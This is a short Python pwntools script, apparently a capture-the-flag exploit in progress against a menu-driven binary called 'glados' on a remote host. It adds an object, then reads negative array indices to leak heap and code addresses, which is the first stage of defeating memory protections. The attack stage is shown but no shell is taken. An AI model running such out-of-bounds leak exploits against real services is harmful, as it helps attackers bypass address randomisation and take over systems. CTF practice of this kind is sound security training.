from pwn import *

#p = process("./glados")
p = remote("plus.or.kr", 8888)

cnt = 1

DEBUG = True

def r(msg):
  response = p.readuntil(msg)
  if DEBUG:
    log.info(response)

def interactWith(num):
  r("Selection: ")
  p.sendline("5")

  r("Number: ")
  p.sendline("%d"%cnt)

def addCore(name, ty, interact = True):
  global cnt
  cnt += 1

  r("Selection: ")
  p.sendline("1")

  r("Selection: ")
  p.sendline("%d"%ty)

  if interact:
    interactWith(cnt)

    length = len(name) + 1
    r("? ")
    p.sendline("%d"%length)

def leak(idx):
  interactWith(2)

  r("Selection: ")
  p.sendline("2")

  r("Entry")
  p.sendline("%d"%idx)

  r("Value: ")
  return p.readuntil("\n")

addCore("AAAA", 3)

heapLeak = int(leak(-3))
codeLeak = int(leak(-4))

log.info (hex(heapLeak) + " " + hex(codeLeak))

#p.interactive()

p.close()
